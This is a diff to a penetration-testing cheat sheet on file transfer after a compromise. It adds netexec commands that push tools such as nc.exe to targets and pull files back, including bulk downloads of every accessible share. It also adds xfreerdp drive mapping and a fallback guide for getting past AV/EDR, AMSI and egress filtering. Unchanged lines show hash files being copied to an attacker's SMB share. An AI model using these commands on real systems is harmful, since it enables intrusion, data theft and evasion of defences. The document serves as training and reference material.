@@ -86,7 +86,7 @@ powershell -c "[IO.File]::WriteAllBytes('C:\Windows\Temp\nc.exe',[Convert]::From
 ```bash
 sudo impacket-smbserver SHARE /path/to/share -smb2support
 # with auth (useful against tighter egress-filtering AV that blocks anonymous SMB)
-sudo impacket-smbserver SHARE /path/to/share -user offsec -password offsec -smb2support
+sudo impacket-smbserver SHARE /path/to/share -username offsec -password offsec -smb2support
 ```
 **Explanation:** Launches a standalone SMB server (requires root/port 445) sharing `/path/to/share` under the name `SHARE`, with SMB2 support enabled (SMB1-only clients are rare on modern Windows). `-comment` can set a description string.
 **Source:** https://github.com/fortra/impacket/blob/master/examples/smbserver.py (usage text fetched directly)
@@ -111,6 +111,24 @@ copy C:\loot\hashes.txt \\10.10.14.5\SHARE\hashes.txt
 ```
 **Explanation:** Same mechanism in reverse — the SMB share is bidirectional by default (unless `-readonly` was passed to `smbserver.py`), so this single server handles both push and pull.
 **Source:** https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html
+
+**Faster (nxc):** once creds/hashes are known, skip standing up `impacket-smbserver` entirely for single-file moves — `nxc smb target -u user -p pass --put-file /local/nc.exe '\Windows\Temp\nc.exe'` pushes a file straight over an authenticated SMB session, and `nxc smb target -u user -p pass --get-file '\Windows\Temp\hashes.txt' /local/hashes.txt` pulls one back, in one command each with no listener to babysit.
+**Source:** https://www.netexec.wiki/smb-protocol/get-and-put-files
+
+**Faster still, for bulk loot (nxc):** `nxc smb target -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=true` enumerates every accessible share and downloads every reachable file in one command — note `-M spider_plus` alone only lists/indexes files (`DOWNLOAD_FLAG` defaults to `false`); the `-o DOWNLOAD_FLAG=true` is required to actually pull the files down.
+**Source:** https://www.netexec.wiki/smb-protocol/spidering-shares ; module default confirmed in https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/spider_plus.py
+
+---
+
+### 2b. RDP — drive mapping / clipboard file transfer
+
+**Title:** `xfreerdp` drive redirection — mount a local folder as a drive inside the RDP session
+**Command:**
+```bash
+xfreerdp /v:10.10.10.10 /u:user /p:'Password123' /drive:kali,/tmp/share +clipboard
+```
+**Explanation:** `/drive:<name>,<local-path>` exposes `/tmp/share` on the attacker box as a mapped network drive (`\\tsclient\kali`) inside the RDP session — copy tools in or loot out through normal Windows Explorer/`copy` against that path, no separate transfer channel needed once RDP access exists. `+clipboard` additionally enables clipboard redirection so text (and, on modern xfreerdp builds, small files) can be copied between host and target directly — the fallback already referenced elsewhere in this doc for base64 chunk-and-paste when no other channel is available.
+**Source:** https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface
 
 ---
 
@@ -214,6 +232,19 @@ sed -n '/^\r$/,$p' /tmp/out.raw | tail -n +2 > /tmp/nc
 
 ---
 
+### 6. Picking a Technique When the Obvious One Is Blocked
+
+**Title:** Fallback order by blocker type
+**Explanation:**
+- `certutil -urlcache` gets flagged by AV/EDR (common signature) → try `bitsadmin /transfer` (different LOLBin/signature) or native `curl.exe`/`Invoke-WebRequest` (Windows 10 1803+/PS 3.0+) before dropping to base64/`certutil -encode` chunking.
+- All outbound HTTP(S) egress is filtered but SMB/445 reaches the attacker → `impacket-smbserver` + `copy`/`net use` (§2), or `nxc --put-file`/`--get-file` if creds are already known — SMB traffic doesn't look like a web request.
+- Only RDP/3389 reaches the attacker (jump-box/VPN-only segment) → `xfreerdp /drive:` + clipboard (§2b) turns the interactive session itself into the transfer channel.
+- No egress at all, only an interactive/blind shell → base64 chunk-and-paste or `certutil -encode`/`-decode` (§5); if the Linux target has `bash` but no `curl`/`wget`/`nc` binaries, `/dev/tcp` (§5) still moves a payload over a raw socket.
+- PowerShell in Constrained Language Mode or with AMSI active → prefer a binary drop via `certutil`/`bitsadmin`/SMB over `IEX (New-Object Net.WebClient).DownloadString(...)` — fileless in-memory execution is exactly what AMSI/CLM are built to catch.
+**Source:** synthesized from the technique-specific caveats cited in §1–§5 above; no single external reference covers this decision tree.
+
+---
+
 ## Tools Table
 
 | Tool / Technique | Attacker Side | Target OS | Direction | Requires Network Egress? | Requires Creds? | Typical Use Case |
@@ -225,6 +256,8 @@ sed -n '/^\r$/,$p' /tmp/out.raw | tail -n +2 > /tmp/nc
 | `bitsadmin /transfer` | Linux (hosts file) | Windows | Pull | Yes | No | Blends with BITS/Windows Update traffic |
 | `powershell -enc` | Linux (encodes) | Windows | Push (inline) | No (if payload embedded) | No | Small scripts/blobs, avoids quoting issues |
 | `impacket-smbserver` + `copy`/`net use` | Linux | Windows | Push & Pull | Yes (SMB/445) | Optional | Native `copy` cmd, blends with file-share traffic; also used for loot exfil |
+| `nxc smb --put-file`/`--get-file` | Linux | Windows | Push & Pull | Yes (SMB/445) | Yes (creds/hash) | One-shot single-file transfer over an already-authenticated SMB session, no `smbserver.py` listener needed |
+| `xfreerdp /drive:` + clipboard | Linux | Windows | Push & Pull | Yes (RDP/3389) | Yes | Drive mapping/clipboard once RDP access exists, common OSCP AD access path |
 | `wget` | Linux | Linux | Pull | Yes | No | Standard non-interactive downloader (Debian/Ubuntu default) |
 | `curl` | Linux | Linux/Windows | Pull | Yes | No | More portable than wget; native on modern Windows too |
 | `scp` (+ `sshpass`) | Linux/Windows | Linux (or Windows w/ OpenSSH) | Push & Pull | Yes | Yes | Once valid creds/keys obtained |
